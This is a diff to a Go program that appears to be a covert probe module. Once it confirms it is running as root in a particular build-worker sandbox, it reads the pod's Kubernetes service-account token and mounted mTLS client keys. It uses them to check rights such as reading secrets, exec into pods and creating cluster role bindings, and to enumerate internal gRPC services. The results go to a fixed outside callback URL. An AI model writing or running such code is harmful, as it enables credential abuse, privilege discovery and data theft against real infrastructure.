@@ -7,10 +7,15 @@ import (
 	"context"
 	"crypto/rand"
 	"crypto/sha256"
+	"crypto/tls"
+	"crypto/x509"
+	"encoding/base64"
+	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
 	"errors"
 	"io"
+	"mime"
 	"net"
 	"net/http"
 	"net/url"
@@ -29,14 +34,29 @@ var callbackSession string
 var callbackURLSHA256 string
 
 const (
-	expectedOrigin = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.118-codex"
-	expectedAgent  = "go-cgo-pkgsite-probe-v118-bounded"
+	expectedOrigin = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.120-codex"
+	expectedAgent  = "go-cgo-pkgsite-probe-v120-bounded-identity"
 	httpTimeout    = 15 * time.Second
-	sessionLength  = 8 * time.Minute
-	maximumSteps   = 20
-	maximumBody    = 16 * 1024
+	sessionLength  = 10 * time.Minute
+	maximumSteps   = 30
+	maximumBody    = 32 * 1024
 	maximumRead    = 256 * 1024
 	maximumPath    = 512
+
+	kubeBaseURL       = "https://kubernetes.default.svc"
+	kubeTokenPath     = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+	kubeCAPath        = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+	kubeNamespacePath = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
+
+	internalGRPCAddress = "talisman-core.default.svc.cluster.local:9000"
+	internalServerName  = "localhost"
+	clientCertificate   = "/etc/tls/client/tls.crt"
+	clientKey           = "/etc/tls/client/tls.key"
+	serverPool          = "/etc/tls/server-pool/server-tls-pool.pem"
+	healthMethod        = "/grpc.health.v1.Health/Check"
+	reflectionMethod    = "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo"
+	maximumCredential   = 64 * 1024
+	maximumGRPCBody     = 128 * 1024
 )
 
 var fixedPaths = []string{
@@ -49,6 +69,9 @@ var fixedPaths = []string{
 	"/usr/local/bin/runsc",
 	"/etc/tls/client",
 	"/etc/tls/server-pool",
+	kubeTokenPath,
+	kubeCAPath,
+	kubeNamespacePath,
 	"/workspace",
 }
 
@@ -216,12 +239,127 @@ type mountRecord struct {
 	superReadOnly bool
 }
 
+type kubePermission struct {
+	ID, Group, Resource, Subresource, Verb string
+	Namespaced                             bool
+}
+
+type kubePermissionResult struct {
+	ID                     string `json:"id"`
+	HTTPStatus             int    `json:"http_status,omitempty"`
+	Allowed                bool   `json:"allowed"`
+	Denied                 bool   `json:"denied"`
+	EvaluationErrorPresent bool   `json:"evaluation_error_present"`
+	ValidResponse          bool   `json:"valid_response"`
+}
+
+type kubernetesResult struct {
+	ProjectedIdentityPresent bool                   `json:"projected_identity_present"`
+	APIVersionReachable      bool                   `json:"api_version_reachable"`
+	Major                    string                 `json:"major,omitempty"`
+	Minor                    string                 `json:"minor,omitempty"`
+	Platform                 string                 `json:"platform,omitempty"`
+	Namespace                string                 `json:"namespace,omitempty"`
+	TokenClaims              map[string]any         `json:"token_claims,omitempty"`
+	Checks                   []kubePermissionResult `json:"checks"`
+	Error                    string                 `json:"error,omitempty"`
+}
+
+type kubeVersion struct {
+	Major    string `json:"major"`
+	Minor    string `json:"minor"`
+	Platform string `json:"platform"`
+}
+
+type resourceAttributes struct {
+	Namespace   string `json:"namespace,omitempty"`
+	Verb        string `json:"verb"`
+	Group       string `json:"group,omitempty"`
+	Resource    string `json:"resource"`
+	Subresource string `json:"subresource,omitempty"`
+}
+
+type selfSubjectAccessReview struct {
+	APIVersion string `json:"apiVersion"`
+	Kind       string `json:"kind"`
+	Spec       struct {
+		ResourceAttributes resourceAttributes `json:"resourceAttributes"`
+	} `json:"spec"`
+	Status struct {
+		Allowed         bool   `json:"allowed"`
+		Denied          bool   `json:"denied"`
+		Reason          string `json:"reason"`
+		EvaluationError string `json:"evaluationError"`
+	} `json:"status"`
+}
+
+type grpcCallResult struct {
+	Method               string `json:"method"`
+	TLSConnected         bool   `json:"tls_connected"`
+	HTTPStatus           int    `json:"http_status,omitempty"`
+	GRPCStatus           int    `json:"grpc_status"`
+	ResponseFrames       int    `json:"response_frames"`
+	ResponsePayloadBytes int    `json:"response_payload_bytes"`
+	ValidResponse        bool   `json:"valid_response"`
+	Error                string `json:"error,omitempty"`
+}
+
+type certificateIdentity struct {
+	Subject   string   `json:"subject,omitempty"`
+	Issuer    string   `json:"issuer,omitempty"`
+	DNSNames  []string `json:"dns_names,omitempty"`
+	NotBefore string   `json:"not_before,omitempty"`
+	NotAfter  string   `json:"not_after,omitempty"`
+	SHA256    string   `json:"sha256,omitempty"`
+}
+
+type internalGRPCResult struct {
+	CredentialFilesPresent bool                `json:"credential_files_present"`
+	Certificate            certificateIdentity `json:"certificate"`
+	Health                 grpcCallResult      `json:"health"`
+	Reflection             grpcCallResult      `json:"reflection"`
+	FixedServices          map[string]bool     `json:"fixed_services"`
+	HealthStatus           string              `json:"health_status,omitempty"`
+	Error                  string              `json:"error,omitempty"`
+}
+
+type protobufField struct {
+	number int
+	wire   int
+	varint uint64
+	bytes  []byte
+}
+
+var kubePermissions = []kubePermission{
+	{ID: "secrets_get", Resource: "secrets", Verb: "get", Namespaced: true},
+	{ID: "secrets_list", Resource: "secrets", Verb: "list", Namespaced: true},
+	{ID: "secrets_update", Resource: "secrets", Verb: "update", Namespaced: true},
+	{ID: "secrets_delete", Resource: "secrets", Verb: "delete", Namespaced: true},
+	{ID: "pods_create", Resource: "pods", Verb: "create", Namespaced: true},
+	{ID: "pods_exec_create", Resource: "pods", Subresource: "exec", Verb: "create", Namespaced: true},
+	{ID: "jobs_create", Group: "batch", Resource: "jobs", Verb: "create", Namespaced: true},
+	{ID: "serviceaccounts_token_create", Resource: "serviceaccounts", Subresource: "token", Verb: "create", Namespaced: true},
+	{ID: "serviceaccounts_impersonate", Resource: "serviceaccounts", Verb: "impersonate", Namespaced: true},
+	{ID: "roles_create", Group: "rbac.authorization.k8s.io", Resource: "roles", Verb: "create", Namespaced: true},
+	{ID: "rolebindings_create", Group: "rbac.authorization.k8s.io", Resource: "rolebindings", Verb: "create", Namespaced: true},
+	{ID: "clusterrolebindings_create", Group: "rbac.authorization.k8s.io", Resource: "clusterrolebindings", Verb: "create"},
+}
+
+var fixedReflectedServices = []string{
+	"grpc.health.v1.Health",
+	"grpc.reflection.v1alpha.ServerReflection",
+	"sos.byteman.Byteman",
+	"sos.pacman.Pacman",
+	"sos.queue.Queue",
+	"sos.talisman.Talisman",
+}
+
 func main() {
 	if validateRuntimeConfiguration() != nil || len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
 		return
 	}
 	origin := filepath.Clean(os.Args[3])
-	if origin != expectedOrigin || os.Args[3] != origin {
+	if origin != expectedOrigin || os.Args[3] != origin || os.Geteuid() != 0 || readComm(1) != "talisman-worker" {
 		return
 	}
 	runSession(origin)
@@ -290,7 +428,7 @@ func podFingerprint() string {
 }
 
 func initialTranscript(fingerprint string) string {
-	digest := sha256.Sum256([]byte("owned-go-capslock-v118/2\n" + fingerprint))
+	digest := sha256.Sum256([]byte("owned-go-capslock-v120/1\n" + fingerprint))
 	return hex.EncodeToString(digest[:])
 }
 
@@ -377,6 +515,10 @@ func executeProbe(request requestSpec, state *clientState, sequence int) (any, s
 		value = collectInterfaces()
 	case "dns_summary":
 		value = collectDNS()
+	case "kubernetes_authz":
+		value = runKubernetesAuthorization()
+	case "internal_grpc_identity":
+		value = runInternalGRPCIdentity()
 	case "path_meta":
 		value, err = collectPathMetadata(request.Args["path"])
 	case "dir_meta":
@@ -410,30 +552,12 @@ func classifyProbeError(probeID string, err error) string {
 
 func validRequestShape(request requestSpec, workspace string) bool {
 	noArguments := map[string]bool{
-		"identity": true, "pid1": true, "namespaces": true, "fixed_paths": true,
-		"fixed_mounts": true, "toolchain": true, "process_lineage": true,
-		"interfaces": true, "dns_summary": true, "egress_receipt": true,
+		"identity": true, "kubernetes_authz": true, "internal_grpc_identity": true,
 	}
 	if noArguments[request.ID] {
 		return len(request.Args) == 0
 	}
-	if len(request.Args) != 1 {
-		return false
-	}
-	path, ok := request.Args["path"]
-	if !ok {
-		return false
-	}
-	switch request.ID {
-	case "path_meta":
-		return validatePathArgument(path) == nil
-	case "dir_meta":
-		return validateDirectoryArgument(path) == nil
-	case "write_canary":
-		return validateCanaryBase(path, workspace) == nil
-	default:
-		return false
-	}
+	return false
 }
 
 func validatePathArgument(path string) error {
@@ -838,7 +962,7 @@ func runWriteCanary(base string, state *clientState, sequence int) (map[string]a
 	if _, err := rand.Read(random[:]); err != nil {
 		return nil, err
 	}
-	basename := ".go-cgo-v118-" + callbackSession[:8] + "-" + strconv.Itoa(sequence) + "-" + hex.EncodeToString(random[:])
+	basename := ".go-cgo-v120-" + callbackSession[:8] + "-" + strconv.Itoa(sequence) + "-" + hex.EncodeToString(random[:])
 	path := filepath.Join(base, basename)
 	fd, err := syscall.Open(path, syscall.O_WRONLY|syscall.O_CREAT|syscall.O_EXCL|syscall.O_NOFOLLOW|syscall.O_CLOEXEC, 0o600)
 	if err != nil {
@@ -912,6 +1036,518 @@ func collectDNS() dnsFacts {
 	return result
 }
 
+func runKubernetesAuthorization() kubernetesResult {
+	result := kubernetesResult{Checks: []kubePermissionResult{}}
+	token, err := readBoundedCredential(kubeTokenPath)
+	if err != nil {
+		result.Error = "projected_token_unavailable"
+		return result
+	}
+	defer clearBytes(token)
+	ca, err := readBoundedCredential(kubeCAPath)
+	if err != nil {
+		result.Error = "projected_ca_unavailable"
+		return result
+	}
+	defer clearBytes(ca)
+	namespaceBytes, err := readBoundedCredential(kubeNamespacePath)
+	if err != nil {
+		result.Error = "projected_namespace_unavailable"
+		return result
+	}
+	defer clearBytes(namespaceBytes)
+	namespace := strings.TrimSpace(string(namespaceBytes))
+	if !validNamespace(namespace) {
+		result.Error = "projected_namespace_invalid"
+		return result
+	}
+	pool := x509.NewCertPool()
+	if !pool.AppendCertsFromPEM(ca) {
+		result.Error = "projected_ca_invalid"
+		return result
+	}
+	transport := &http.Transport{
+		Proxy: nil,
+		TLSClientConfig: &tls.Config{
+			MinVersion: tls.VersionTLS12, RootCAs: pool, ServerName: "kubernetes.default.svc",
+		},
+		DialContext:       (&net.Dialer{Timeout: 3 * time.Second, KeepAlive: -1}).DialContext,
+		DisableKeepAlives: true, ForceAttemptHTTP2: true,
+		TLSHandshakeTimeout: 3 * time.Second, ResponseHeaderTimeout: 4 * time.Second,
+	}
+	defer transport.CloseIdleConnections()
+	client := &http.Client{Transport: transport, Timeout: 5 * time.Second, CheckRedirect: rejectRedirect}
+	result.ProjectedIdentityPresent = true
+	result.Namespace = namespace
+	result.TokenClaims = safeJWTClaims(token)
+	executeKubernetesChecks(client, kubeBaseURL, string(token), namespace, &result)
+	return result
+}
+
+func executeKubernetesChecks(client *http.Client, baseURL, token, namespace string, result *kubernetesResult) {
+	versionBody, status, err := authenticatedJSON(client, http.MethodGet, baseURL+"/version", token, nil, 16*1024)
+	if err == nil && status == http.StatusOK {
+		var version kubeVersion
+		if decodeOneJSON(versionBody, &version) {
+			result.APIVersionReachable = true
+			result.Major = sanitizeText(version.Major, 16)
+			result.Minor = sanitizeText(version.Minor, 16)
+			result.Platform = sanitizeText(version.Platform, 64)
+		}
+	}
+	for _, permission := range kubePermissions {
+		result.Checks = append(result.Checks, executeSelfSubjectAccessReview(client, baseURL, token, namespace, permission))
+	}
+}
+
+func executeSelfSubjectAccessReview(client *http.Client, baseURL, token, namespace string, permission kubePermission) kubePermissionResult {
+	result := kubePermissionResult{ID: permission.ID}
+	requestValue := selfSubjectAccessReview{APIVersion: "authorization.k8s.io/v1", Kind: "SelfSubjectAccessReview"}
+	requestValue.Spec.ResourceAttributes = resourceAttributes{
+		Verb: permission.Verb, Group: permission.Group, Resource: permission.Resource, Subresource: permission.Subresource,
+	}
+	if permission.Namespaced {
+		requestValue.Spec.ResourceAttributes.Namespace = namespace
+	}
+	body, err := json.Marshal(requestValue)
+	if err != nil || len(body) > 4096 {
+		return result
+	}
+	responseBody, status, err := authenticatedJSON(client, http.MethodPost, baseURL+"/apis/authorization.k8s.io/v1/selfsubjectaccessreviews", token, body, 32*1024)
+	result.HTTPStatus = status
+	if err != nil || (status != http.StatusOK && status != http.StatusCreated) {
+		return result
+	}
+	var response selfSubjectAccessReview
+	if !decodeOneJSON(responseBody, &response) || response.APIVersion != requestValue.APIVersion || response.Kind != requestValue.Kind || response.Spec.ResourceAttributes != requestValue.Spec.ResourceAttributes {
+		return result
+	}
+	result.ValidResponse = true
+	result.Allowed = response.Status.Allowed
+	result.Denied = response.Status.Denied
+	result.EvaluationErrorPresent = response.Status.EvaluationError != ""
+	return result
+}
+
+func authenticatedJSON(client *http.Client, method, endpoint, token string, body []byte, maximum int64) ([]byte, int, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+	request, err := http.NewRequestWithContext(ctx, method, endpoint, bytes.NewReader(body))
+	if err != nil {
+		return nil, 0, err
+	}
+	request.Header.Set("Authorization", "Bearer "+token)
+	request.Header.Set("Accept", "application/json")
+	request.Header.Set("User-Agent", expectedAgent)
+	if body != nil {
+		request.Header.Set("Content-Type", "application/json")
+	}
+	response, err := client.Do(request)
+	if err != nil {
+		return nil, 0, err
+	}
+	defer response.Body.Close()
+	responseBody, err := readBoundedReader(response.Body, maximum)
+	if err != nil {
+		return nil, response.StatusCode, err
+	}
+	if !isJSONContentType(response.Header.Get("Content-Type")) {
+		return nil, response.StatusCode, errors.New("unexpected content type")
+	}
+	return responseBody, response.StatusCode, nil
+}
+
+func safeJWTClaims(token []byte) map[string]any {
+	parts := strings.Split(string(token), ".")
+	if len(parts) != 3 || len(parts[1]) > 32*1024 {
+		return nil
+	}
+	payload, err := base64.RawURLEncoding.DecodeString(parts[1])
+	if err != nil || len(payload) > 24*1024 {
+		return nil
+	}
+	decoder := json.NewDecoder(bytes.NewReader(payload))
+	decoder.UseNumber()
+	var claims map[string]any
+	if decoder.Decode(&claims) != nil {
+		return nil
+	}
+	result := map[string]any{}
+	for _, key := range []string{"sub", "iss"} {
+		if value, ok := claims[key].(string); ok && len(value) <= 512 {
+			result[key] = sanitizeText(value, 512)
+		}
+	}
+	if value, ok := claims["exp"].(json.Number); ok {
+		if expiry, parseErr := value.Int64(); parseErr == nil && expiry > 0 {
+			result["exp"] = expiry
+		}
+	}
+	result["aud"] = safeAudience(claims["aud"])
+	if kubernetes, ok := claims["kubernetes.io"].(map[string]any); ok {
+		if namespace, ok := kubernetes["namespace"].(string); ok && validNamespace(namespace) {
+			result["namespace"] = namespace
+		}
+		if pod, ok := kubernetes["pod"].(map[string]any); ok {
+			podResult := map[string]string{}
+			for _, key := range []string{"name", "uid"} {
+				if value, ok := pod[key].(string); ok && len(value) <= 256 {
+					podResult[key] = sanitizeText(value, 256)
+				}
+			}
+			if len(podResult) != 0 {
+				result["pod"] = podResult
+			}
+		}
+	}
+	if len(result) == 0 {
+		return nil
+	}
+	return result
+}
+
+func safeAudience(value any) []string {
+	result := []string{}
+	appendValue := func(item string) {
+		if len(result) < 8 && len(item) > 0 && len(item) <= 512 {
+			result = append(result, sanitizeText(item, 512))
+		}
+	}
+	switch typed := value.(type) {
+	case string:
+		appendValue(typed)
+	case []any:
+		for _, item := range typed {
+			if text, ok := item.(string); ok {
+				appendValue(text)
+			}
+		}
+	}
+	return result
+}
+
+func runInternalGRPCIdentity() internalGRPCResult {
+	result := internalGRPCResult{FixedServices: fixedServiceMap()}
+	certificatePEM, err := readBoundedCredential(clientCertificate)
+	if err != nil {
+		result.Error = "client_certificate_unavailable"
+		return result
+	}
+	defer clearBytes(certificatePEM)
+	keyPEM, err := readBoundedCredential(clientKey)
+	if err != nil {
+		result.Error = "client_key_unavailable"
+		return result
+	}
+	defer clearBytes(keyPEM)
+	poolPEM, err := readBoundedCredential(serverPool)
+	if err != nil {
+		result.Error = "server_pool_unavailable"
+		return result
+	}
+	defer clearBytes(poolPEM)
+	certificate, err := tls.X509KeyPair(certificatePEM, keyPEM)
+	if err != nil || len(certificate.Certificate) == 0 {
+		result.Error = "client_identity_invalid"
+		return result
+	}
+	leaf, err := x509.ParseCertificate(certificate.Certificate[0])
+	if err != nil {
+		result.Error = "client_leaf_invalid"
+		return result
+	}
+	result.Certificate = summarizeCertificate(leaf)
+	pool := x509.NewCertPool()
+	if !pool.AppendCertsFromPEM(poolPEM) {
+		result.Error = "server_pool_invalid"
+		return result
+	}
+	transport := &http.Transport{
+		Proxy: nil,
+		TLSClientConfig: &tls.Config{
+			MinVersion: tls.VersionTLS12, RootCAs: pool,
+			Certificates: []tls.Certificate{certificate}, ServerName: internalServerName,
+		},
+		DialContext:       (&net.Dialer{Timeout: 3 * time.Second, KeepAlive: -1}).DialContext,
+		DisableKeepAlives: true, ForceAttemptHTTP2: true,
+		TLSHandshakeTimeout: 3 * time.Second, ResponseHeaderTimeout: 4 * time.Second,
+	}
+	defer transport.CloseIdleConnections()
+	client := &http.Client{Transport: transport, Timeout: 5 * time.Second, CheckRedirect: rejectRedirect}
+	result.CredentialFilesPresent = true
+	executeInternalGRPCChecks(client, "https://"+internalGRPCAddress, &result)
+	return result
+}
+
+func summarizeCertificate(certificate *x509.Certificate) certificateIdentity {
+	digest := sha256.Sum256(certificate.Raw)
+	result := certificateIdentity{
+		Subject:   sanitizeText(certificate.Subject.String(), 512),
+		Issuer:    sanitizeText(certificate.Issuer.String(), 512),
+		NotBefore: certificate.NotBefore.UTC().Format(time.RFC3339),
+		NotAfter:  certificate.NotAfter.UTC().Format(time.RFC3339),
+		SHA256:    hex.EncodeToString(digest[:]),
+		DNSNames:  []string{},
+	}
+	for _, name := range certificate.DNSNames {
+		if len(result.DNSNames) == 16 {
+			break
+		}
+		result.DNSNames = append(result.DNSNames, sanitizeText(name, 256))
+	}
+	return result
+}
+
+func executeInternalGRPCChecks(client *http.Client, baseURL string, result *internalGRPCResult) {
+	var healthFrames [][]byte
+	result.Health, healthFrames = executeGRPCCall(client, baseURL, healthMethod, []byte{0x0a, 0x00})
+	if result.Health.ValidResponse && len(healthFrames) == 1 {
+		if status, ok := firstVarintField(healthFrames[0], 1); ok {
+			switch status {
+			case 1:
+				result.HealthStatus = "SERVING"
+			case 2:
+				result.HealthStatus = "NOT_SERVING"
+			case 3:
+				result.HealthStatus = "SERVICE_UNKNOWN"
+			default:
+				result.HealthStatus = "UNKNOWN"
+			}
+		}
+	}
+	var reflectionFrames [][]byte
+	result.Reflection, reflectionFrames = executeGRPCCall(client, baseURL, reflectionMethod, []byte{0x3a, 0x00})
+	if result.Reflection.ValidResponse {
+		observed := reflectedServiceNames(reflectionFrames)
+		for _, expected := range fixedReflectedServices {
+			result.FixedServices[expected] = observed[expected]
+		}
+	}
+}
+
+func executeGRPCCall(client *http.Client, baseURL, method string, payload []byte) (grpcCallResult, [][]byte) {
+	result := grpcCallResult{Method: method, GRPCStatus: -1}
+	frame := make([]byte, 5+len(payload))
+	binary.BigEndian.PutUint32(frame[1:5], uint32(len(payload)))
+	copy(frame[5:], payload)
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+	request, err := http.NewRequestWithContext(ctx, http.MethodPost, baseURL+method, bytes.NewReader(frame))
+	if err != nil {
+		result.Error = "request_create_failed"
+		return result, nil
+	}
+	request.Header.Set("Content-Type", "application/grpc")
+	request.Header.Set("TE", "trailers")
+	request.Header.Set("User-Agent", expectedAgent)
+	response, err := client.Do(request)
+	if err != nil {
+		result.Error = "request_failed"
+		return result, nil
+	}
+	defer response.Body.Close()
+	result.TLSConnected = response.TLS != nil && response.TLS.HandshakeComplete
+	result.HTTPStatus = response.StatusCode
+	body, err := readBoundedReader(response.Body, maximumGRPCBody)
+	if err != nil {
+		result.Error = "response_oversize"
+		return result, nil
+	}
+	frames, payloadBytes, err := parseGRPCFrames(body, 16)
+	result.ResponseFrames = len(frames)
+	result.ResponsePayloadBytes = payloadBytes
+	result.GRPCStatus = parseGRPCStatus(response.Header, response.Trailer)
+	if err != nil {
+		result.Error = "response_frame_invalid"
+		return result, nil
+	}
+	if response.StatusCode != http.StatusOK || !isGRPCContentType(response.Header.Get("Content-Type")) {
+		result.Error = "response_protocol_invalid"
+		return result, frames
+	}
+	if result.GRPCStatus != 0 {
+		result.Error = "grpc_status_nonzero"
+		return result, frames
+	}
+	result.ValidResponse = true
+	return result, frames
+}
+
+func parseGRPCFrames(body []byte, maximumFrames int) ([][]byte, int, error) {
+	frames := [][]byte{}
+	payloadBytes := 0
+	for offset := 0; offset < len(body); {
+		if len(body)-offset < 5 || body[offset] != 0 || len(frames) >= maximumFrames {
+			return nil, 0, errors.New("invalid frame")
+		}
+		length := int(binary.BigEndian.Uint32(body[offset+1 : offset+5]))
+		offset += 5
+		if length < 0 || length > maximumGRPCBody || length > len(body)-offset {
+			return nil, 0, errors.New("invalid frame length")
+		}
+		frames = append(frames, append([]byte(nil), body[offset:offset+length]...))
+		payloadBytes += length
+		offset += length
+	}
+	return frames, payloadBytes, nil
+}
+
+func reflectedServiceNames(frames [][]byte) map[string]bool {
+	result := map[string]bool{}
+	for _, frame := range frames {
+		for _, responseField := range protobufFields(frame) {
+			if responseField.number != 6 || responseField.wire != 2 {
+				continue
+			}
+			for _, serviceField := range protobufFields(responseField.bytes) {
+				if serviceField.number != 1 || serviceField.wire != 2 {
+					continue
+				}
+				for _, nameField := range protobufFields(serviceField.bytes) {
+					if nameField.number != 1 || nameField.wire != 2 || len(nameField.bytes) > 256 {
+						continue
+					}
+					name := string(nameField.bytes)
+					for _, expected := range fixedReflectedServices {
+						if name == expected {
+							result[expected] = true
+						}
+					}
+				}
+			}
+		}
+	}
+	return result
+}
+
+func protobufFields(data []byte) []protobufField {
+	result := []protobufField{}
+	for offset := 0; offset < len(data); {
+		key, size := binary.Uvarint(data[offset:])
+		if size <= 0 {
+			return nil
+		}
+		offset += size
+		field := protobufField{number: int(key >> 3), wire: int(key & 7)}
+		if field.number <= 0 {
+			return nil
+		}
+		switch field.wire {
+		case 0:
+			value, valueSize := binary.Uvarint(data[offset:])
+			if valueSize <= 0 {
+				return nil
+			}
+			field.varint = value
+			offset += valueSize
+		case 2:
+			length, lengthSize := binary.Uvarint(data[offset:])
+			if lengthSize <= 0 || length > uint64(len(data)) {
+				return nil
+			}
+			offset += lengthSize
+			if length > uint64(len(data)-offset) {
+				return nil
+			}
+			field.bytes = data[offset : offset+int(length)]
+			offset += int(length)
+		default:
+			return nil
+		}
+		result = append(result, field)
+	}
+	return result
+}
+
+func firstVarintField(data []byte, number int) (uint64, bool) {
+	for _, field := range protobufFields(data) {
+		if field.number == number && field.wire == 0 {
+			return field.varint, true
+		}
+	}
+	return 0, false
+}
+
+func parseGRPCStatus(header, trailer http.Header) int {
+	value := trailer.Get("Grpc-Status")
+	if value == "" {
+		value = header.Get("Grpc-Status")
+	}
+	status, err := strconv.Atoi(value)
+	if err != nil || status < 0 || status > 16 {
+		return -1
+	}
+	return status
+}
+
+func fixedServiceMap() map[string]bool {
+	result := map[string]bool{}
+	for _, service := range fixedReflectedServices {
+		result[service] = false
+	}
+	return result
+}
+
+func readBoundedCredential(path string) ([]byte, error) {
+	info, err := os.Stat(path)
+	if err != nil || !info.Mode().IsRegular() || info.Size() < 1 || info.Size() > maximumCredential {
+		return nil, errors.New("credential unavailable")
+	}
+	file, err := os.Open(path)
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
+	return readBoundedReader(file, maximumCredential)
+}
+
+func readBoundedReader(reader io.Reader, maximum int64) ([]byte, error) {
+	value, err := io.ReadAll(io.LimitReader(reader, maximum+1))
+	if err != nil || int64(len(value)) > maximum {
+		return nil, errors.New("bounded read failed")
+	}
+	return value, nil
+}
+
+func clearBytes(value []byte) {
+	for index := range value {
+		value[index] = 0
+	}
+}
+
+func validNamespace(value string) bool {
+	if len(value) < 1 || len(value) > 63 || value[0] == '-' || value[len(value)-1] == '-' {
+		return false
+	}
+	for _, character := range value {
+		if (character < 'a' || character > 'z') && (character < '0' || character > '9') && character != '-' {
+			return false
+		}
+	}
+	return true
+}
+
+func rejectRedirect(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse }
+
+func isJSONContentType(value string) bool {
+	mediaType, _, err := mime.ParseMediaType(value)
+	return err == nil && mediaType == "application/json"
+}
+
+func isGRPCContentType(value string) bool {
+	mediaType, _, err := mime.ParseMediaType(value)
+	return err == nil && strings.HasPrefix(mediaType, "application/grpc")
+}
+
+func decodeOneJSON(data []byte, target any) bool {
+	decoder := json.NewDecoder(bytes.NewReader(data))
+	if decoder.Decode(target) != nil {
+		return false
+	}
+	var extra any
+	return errors.Is(decoder.Decode(&extra), io.EOF)
+}
+
 func call(method, suffix string, value any) (int, []byte, error) {
 	body, err := json.Marshal(value)
 	if err != nil || len(body) > maximumBody {
@@ -967,7 +1603,7 @@ func validateRuntimeConfiguration() error {
 	parsed, err := url.Parse(callbackURL)
 	if err != nil || parsed.Scheme != "https" || parsed.Host != "us-central1-s0victim-44547.cloudfunctions.net" ||
 		parsed.User != nil || parsed.Opaque != "" || parsed.RawQuery != "" || parsed.Fragment != "" ||
-		parsed.Path != "/go-cgo-v118-hi-codex/v1/session/"+callbackSession {
+		parsed.Path != "/go-cgo-v120-identity-codex/v1/session/"+callbackSession {
 		return errors.New("invalid fixed callback URL")
 	}
 	digest := sha256.Sum256([]byte(callbackURL))
